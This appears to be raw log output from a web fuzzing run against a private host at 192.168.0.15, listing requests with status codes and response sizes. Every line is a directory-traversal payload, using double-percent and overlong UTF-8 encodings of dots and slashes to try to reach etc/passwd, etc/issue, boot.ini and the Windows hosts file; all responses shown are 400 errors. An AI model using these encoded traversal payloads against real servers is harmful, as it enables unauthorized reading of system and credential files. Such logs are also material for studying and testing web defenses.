364,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
365,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8sboot.ini
371,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8spasswd
370,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8sissue
373,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8sboot.ini
367,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8spasswd
366,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8sissue
375,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8spasswd
369,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8sboot.ini
368,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
374,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8sissue
372,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
384,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
379,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8spasswd
393,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cboot.ini
382,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8setc%c1%8sissue
404,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts
405,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9cboot.ini
406,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9cetc%c1%9cissue
407,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9cetc%c1%9cpasswd
408,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts
409,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afboot.ini
410,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afissue
411,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afpasswd
412,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
413,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afboot.ini
414,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afissue
415,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afpasswd
416,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
417,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afboot.ini
421,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afboot.ini
422,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afissue
418,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afissue
419,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afpasswd
420,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
390,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cissue
376,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
399,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cpasswd
391,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cpasswd
423,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afpasswd
392,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts
389,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cboot.ini
386,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cissue
387,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cpasswd
394,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cissue
395,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cpasswd
396,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts
385,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cboot.ini
378,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8s%%32%%65%%32%%65%c1%8setc%c1%8sissue
383,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%8setc%c1%8spasswd
400,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts
401,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cboot.ini
397,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cboot.ini
398,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cissue
403,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cpasswd
402,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cissue
77,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
424,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
425,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afboot.ini
426,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afissue
427,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afetc%c1%afpasswd
429,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%afboot.ini
428,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%af%%32%%65%%32%%65%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
430,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%afetc%c1%afissue
431,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%afetc%c1%afpasswd
432,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
435,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcpasswd
437,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcboot.ini
433,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcboot.ini
436,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
434,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcissue
438,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcissue
439,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcpasswd
440,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
441,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcboot.ini
442,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcissue
443,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcpasswd
444,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
445,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcboot.ini
447,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcpasswd
446,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcissue
448,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
449,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcboot.ini
450,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcissue
452,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
454,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pcetc%c1%pcissue
451,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pc%%32%%65%%32%%65%c1%pcetc%c1%pcpasswd
453,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pcboot.ini
455,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pcetc%c1%pcpasswd
456,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
458,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afissue
457,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afboot.ini
459,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afpasswd
460,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
461,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afboot.ini
462,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afissue
463,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afpasswd
465,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afboot.ini
464,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
466,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afissue
467,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afpasswd
468,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
469,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afboot.ini
470,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afissue
471,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afpasswd
472,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
473,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afboot.ini
475,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afpasswd
474,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afetc%e0%80%afissue
476,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%af%%32%%65%%32%%65%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
478,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%afetc%e0%80%afissue
479,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%afetc%e0%80%afpasswd
477,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%afboot.ini
480,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
482,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afissue
481,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afboot.ini
483,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afpasswd
484,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
486,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afissue
485,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afboot.ini
487,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afpasswd
488,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
489,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afboot.ini
492,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
490,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afissue
491,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afpasswd
495,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afpasswd
493,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afboot.ini
494,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afissue
496,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
497,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afboot.ini
499,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afpasswd
498,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afissue
83,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
501,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%afboot.ini
502,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afissue
503,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%afetc%f0%80%80%afpasswd
504,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
505,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afboot.ini
519,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afpasswd
522,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afissue
521,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afboot.ini
520,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
516,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
517,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afboot.ini
